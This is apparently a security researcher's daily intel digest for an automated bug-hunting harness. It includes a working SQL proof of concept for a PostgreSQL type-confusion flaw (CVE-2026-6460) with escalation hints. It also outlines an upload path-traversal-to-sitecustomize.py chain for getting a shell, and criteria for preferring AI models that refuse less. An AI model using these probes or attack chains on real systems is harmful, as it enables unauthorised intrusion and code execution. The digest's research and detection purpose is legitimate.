# 2026-11-27 harness digest

Actionable detection signals from today's intel. Full verbatim sources linked; nothing invented.

## 1. PostgreSQL composite ALTER TYPE after PREPARE (CVE-2026-6460 / core primitive)

- **Signal:** any managed Postgres / Postgres-compatible offering that allows non-superuser `CREATE TYPE` + `ALTER TYPE … ALTER ATTRIBUTE` + prepared statements; extensions that rebuild foreign arrays as Datums (ClickHouse, etc.).
- **Probe:**
  ```sql
  CREATE TYPE pg_temp.poc AS (key uuid);
  PREPARE pc AS SELECT '(01020000-0000-0000-0000-000000000000)'::pg_temp.poc;
  ALTER TYPE pg_temp.poc ALTER ATTRIBUTE key TYPE bytea CASCADE;
  EXECUTE pc;
  ```
  Crash / unexpected output = type confusion. Escalate by forging ExpandedObjectHeader/methods (see writeup) and by 3-UUID array → `unnest` pointer leak.
- **Sources:** [posts/0xacb/2026-11-26-2125948257977184643.md](../../posts/0xacb/2026-11-26-2125948257977184643.md), [writeups/0xacb/mdisec-pg-clickhouse-type-confusion-rce-cve-2026-6460.md](../../writeups/0xacb/mdisec-pg-clickhouse-type-confusion-rce-cve-2026-6460.md).

## 2. Cairn-style autonomous agents → upload path traversal → sitecustomize.py

- **Signal:** unauthenticated or weakly-auth'd AI apps with file upload / filename params; Python services that import `sitecustomize.py` / auto-run on new interpreter spawn.
- **Automate:** map API → fuzz filename path traversal → write into import path → trigger any endpoint that spawns Python. Time-to-shell in the AWS case was ~11 minutes.
- **Sources:** [writeups/mdp_sec/aws-cairn-ai-agents-zero-day-monai-label-cve-2026-133968.md](../../writeups/mdp_sec/aws-cairn-ai-agents-zero-day-monai-label-cve-2026-133968.md).

## 3. Trailmark reachability before deep audit

- Run `uv tool install trailmark` then `reachable_from` / `paths_between` (opt-in `edge_kinds`) on target codebases; prioritise sinks fed by user input. v0.9.0 adds Lean/Dafny/F*/Rocq/WhyML/TLA+/Tamarin/ProVerif.
- **Sources:** [posts/trailofbits/2026-11-25-2125561387241857029.md](../../posts/trailofbits/2026-11-25-2125561387241857029.md), [writeups/trailofbits/trailmark-v0-9-0-release.md](../../writeups/trailofbits/trailmark-v0-9-0-release.md).

## 4. BB Arena model-selection gates for Dorothy's harness

1. Drop refusal-heavy configs (>10/100) before trusting headline solves.
2. Match vulnerability-class grid to authorised scope (DeepSeek AC-strong; Opus secrets/crypto + AI-agent labs).
3. Expect ≤3/10 on black-box code-execution; keep human/white-box paths for 2shell-class bugs.
4. Prove every finding by hand.
- **Sources:** [posts/mdp_sec/2026-11-26-2125809861527261304.md](../../posts/mdp_sec/2026-11-26-2125809861527261304.md), [posts/mdp_sec/2026-11-26-2126083577351934357.md](../../posts/mdp_sec/2026-11-26-2126083577351934357.md), [writeups/mdp_sec/blackboxarena-home-2026-11-27.md](../../writeups/mdp_sec/blackboxarena-home-2026-11-27.md), [CTF](../../writeups/mdp_sec/blackboxarena-ctf-2026-11-26.md).

## 5. Unicode RTLO in uploaded filenames (Nextcloud Notes H1 #3490059)

- Strip U+202E / bidi overrides from attachment names; UI that trusts displayed extension is a social-engineering vector even without server RCE.
- **Source:** [hackerone/reports/2026/3490059.md](../../hackerone/reports/2026/3490059.md).
